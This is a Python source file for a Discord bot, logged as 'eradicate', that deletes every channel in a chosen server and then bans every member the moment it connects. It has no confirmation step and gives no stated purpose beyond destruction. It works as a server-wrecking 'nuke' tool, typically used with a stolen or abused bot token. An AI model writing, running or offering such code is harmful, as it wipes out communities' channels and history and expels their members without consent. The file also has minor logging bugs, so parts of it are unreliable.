import discord
import logging
from discord.ext import commands

from config import TOKEN, GUILD_ID

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

logger = logging.getLogger("eradicate")

intents = discord.Intents.default()
intents.guilds = True
intents.members = True


bot = commands.Bot(
    command_prefix="!",
    intents=intents
)


async def get_target_guild():
    guild = bot.get_guild(GUILD_ID)

    if guild is None:
        raise RuntimeError(
            f"Target guild {GUILD_ID} not found"
        )

    return guild


async def get_all_members(guild: discord.Guild):
    members = []

    async for member in guild.fetch_members(limit=None):
        members.append(member)

    return members

@bot.event
async def on_ready():
    logger.info("Connected as %s", bot.user)

    try:
        guild = await get_target_guild()
        logger.info("Target server: %s (%s)", guild.name, guild.id)

        channels = guild.channels
        logger.info("%s channels found", len(channels))

        for channel in channels:
            try:
                logger.info("Processing channel: %s (%s)", channel.name, channel.id)
                await channel.delete(reason="Delete")

            except discord.Forbidden:
                logger.warning("Skipped channel (missing permissions): %s", channel.name)

            except discord.HTTPException as error:
                logger.error("Failed channel: %s | %s", channel.name, error)

        members = await get_all_members(guild)
        for member in members:
            try:
                await guild.ban(member, reason="Ban")
                logger.info("Member found: %s (%s)", member, member.id)

            except discord.Forbidden:
                logger.warning("Skipped member (missing permissions): %s", member, member.id)

            except discord.HTTPException as error:
                logger.error("Failed channel: %s | %s", member, error)

    except RuntimeError as error:
        logger.error("ERROR: %s", error)


if __name__ == "__main__":
    bot.run(TOKEN)
